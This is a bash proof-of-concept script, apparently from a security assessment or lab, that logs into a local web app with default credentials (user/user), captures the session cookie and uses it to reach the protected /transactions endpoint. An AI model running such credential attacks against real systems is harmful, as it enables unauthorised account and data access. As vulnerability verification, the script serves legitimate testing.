#!/bin/bash

# POC: Default Credentials Authentication Bypass
# Demonstrates that the application accepts default credentials (user/user)
# and grants access to protected endpoints

TARGET="http://localhost:5003"
USERNAME="user"
PASSWORD="user"

echo "=== Default Credentials Authentication Bypass POC ==="
echo ""
echo "Target: $TARGET"
echo "Testing default credentials - Username: $USERNAME, Password: $PASSWORD"
echo ""

# Test 1: Attempt login with default credentials
echo "[*] Attempting login with default credentials..."
RESPONSE=$(curl -s -i -X POST "$TARGET/login" \
  -d "username=$USERNAME&password=$PASSWORD" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1)

echo "$RESPONSE" > /tmp/login_response.txt

# Extract status code and headers
STATUS_CODE=$(echo "$RESPONSE" | head -n 1 | awk '{print $2}')
LOCATION=$(echo "$RESPONSE" | grep -i "Location:" | awk '{print $2}' | tr -d '\r')
SESSION_COOKIE=$(echo "$RESPONSE" | grep -i "Set-Cookie:" | grep "session=" | sed 's/.*session=\([^;]*\).*/\1/')

echo "[+] Response Status: $STATUS_CODE"
echo "[+] Location Header: $LOCATION"
echo "[+] Session Cookie Set: ${SESSION_COOKIE:0:30}..." 

echo ""
echo "[*] Checking if authentication was successful..."

# Success condition: HTTP 302 redirect to /transactions with session cookie
if [ "$STATUS_CODE" = "302" ] && [ "$LOCATION" = "/transactions" ] && [ -n "$SESSION_COOKIE" ]; then
    echo "[+] SUCCESS: Default credentials accepted!"
    echo "[+] Redirect confirms successful authentication"
    echo ""
    
    # Test 2: Try accessing protected endpoint with the session cookie
    echo "[*] Attempting to access protected /transactions endpoint with session cookie..."
    TRANSACTIONS=$(curl -s -i -H "Cookie: session=$SESSION_COOKIE" "$TARGET/transactions" 2>&1)
    
    TRANS_STATUS=$(echo "$TRANSACTIONS" | head -n 1 | awk '{print $2}')
    echo "[+] Transactions Endpoint Status: $TRANS_STATUS"
    
    if [ "$TRANS_STATUS" = "200" ]; then
        echo "[+] SUCCESS: Protected endpoint accessible with default credentials!"
        echo ""
        echo "=== VULNERABILITY CONFIRMED ==="
        echo "Default credentials (user/user) provide full authentication access"
        echo "Attacker can access protected endpoints like /transactions"
        exit 0
    else
        echo "[-] Could not access transactions endpoint"
        exit 1
    fi
else
    echo "[-] FAILED: Default credentials were not accepted"
    echo "[-] Status Code: $STATUS_CODE (expected 302)"
    echo "[-] Location: $LOCATION (expected /transactions)"
    echo "[-] Session Cookie: ${SESSION_COOKIE:-(none)}"
    exit 1
fi